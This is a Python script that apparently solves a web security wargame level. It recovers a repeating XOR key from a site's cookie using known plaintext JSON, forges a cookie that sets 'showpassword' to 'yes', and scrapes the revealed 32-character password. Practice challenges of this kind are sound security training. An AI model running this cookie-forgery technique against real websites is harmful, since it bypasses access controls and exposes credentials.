import config
import os, re, json, base64, urllib
from requests import *

user = os.path.splitext(__file__)[0]
password = raw_input("Enter password: ").strip()

url = "http://{}.{}".format(user, config.url)

def xor_encrypt(inp, key):
	output = ""
	for i in range(len(inp)):
		output += chr(ord(inp[i]) ^ ord(key[i % len(key)]))
	return output

response = get(url, auth=(user, password))

encoded_data = base64.b64decode(urllib.unquote(response.cookies["data"]))
decoded_data = json.dumps({"showpassword" : "no", "bgcolor" : "#ffffff"}, separators=(",", ":"))

secret_key = xor_encrypt(encoded_data, decoded_data)[:4]

required_data = base64.b64encode(
						xor_encrypt(
							json.dumps({"showpassword" : "yes", "bgcolor" : "#ffffff"}, separators=(",", ":")), 
							secret_key
						)
					)

response = get(url, auth=(user, password), cookies={"data" : required_data})
password = re.findall(r"\w{32}", response.content)[-1]

print(password)
